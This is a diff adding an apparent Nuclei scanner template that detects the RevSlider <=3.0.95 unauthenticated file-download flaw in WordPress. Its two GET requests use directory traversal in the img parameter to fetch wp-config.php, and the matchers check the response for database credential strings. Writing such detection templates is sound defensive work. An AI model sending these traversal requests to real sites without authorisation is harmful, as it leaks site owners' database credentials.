@@ -1,0 +1,32 @@
+id: reconner-wp-revslider-file-read
+info:
+  name: WordPress Slider Revolution (RevSlider) <=3.0.95 unauthenticated arbitrary file download
+  author: reconner
+  severity: critical
+  description: |
+    Old Slider Revolution builds expose the revslider_show_image AJAX action to
+    unauthenticated users without sanitising the img parameter, allowing
+    directory traversal to read arbitrary files — here wp-config.php, leaking the
+    database credentials. The match requires the real wp-config source
+    (DB_PASSWORD + DB_NAME + define), so only a genuinely vulnerable install fires.
+  reference:
+    - https://www.exploit-db.com/exploits/35385
+  tags: reconner,wordpress,revslider,lfi,traversal
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php"
+      - "{{BaseURL}}/wp-admin/admin-ajax.php?action=revslider_show_image&img=../../wp-config.php"
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "DB_PASSWORD"
+          - "DB_NAME"
+          - "define("
+        condition: and
+      - type: status
+        status:
+          - 200
